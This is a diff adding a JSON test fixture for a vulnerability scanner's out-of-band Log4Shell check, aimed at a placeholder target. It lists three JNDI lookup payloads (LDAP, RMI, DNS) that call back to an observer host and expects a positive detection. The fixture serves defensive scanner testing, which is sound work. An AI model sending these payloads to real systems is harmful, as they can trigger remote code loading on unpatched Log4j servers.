@@ -1,0 +1,19 @@
+{
+  "engine": "framework_zero_day_engines._run_oob_scan",
+  "kwargs": {
+    "engine_name": "Log4Shell",
+    "url": "https://target.example/app",
+    "param": "p",
+    "parsed_query": "p=x",
+    "payload_templates": [
+      "${jndi:ldap://{OBS_DNS}/exp}",
+      "${jndi:rmi://{OBS_DNS}/exp}",
+      "${jndi:dns://{OBS_DNS}/exp}"
+    ],
+    "type_label": "Log4Shell",
+    "evidence_note": "log4shell fixture positive: unpatched log4j 2.x 触发 JNDI DNS/ LDAP 回调",
+    "recommendation": "升级至 Log4j 2.17.1+ 并设置 JndiLookup 白名单",
+    "oob_wait": 1
+  },
+  "expected": {"not_none": true, "type": "Log4Shell(带外实锤)"}
+}
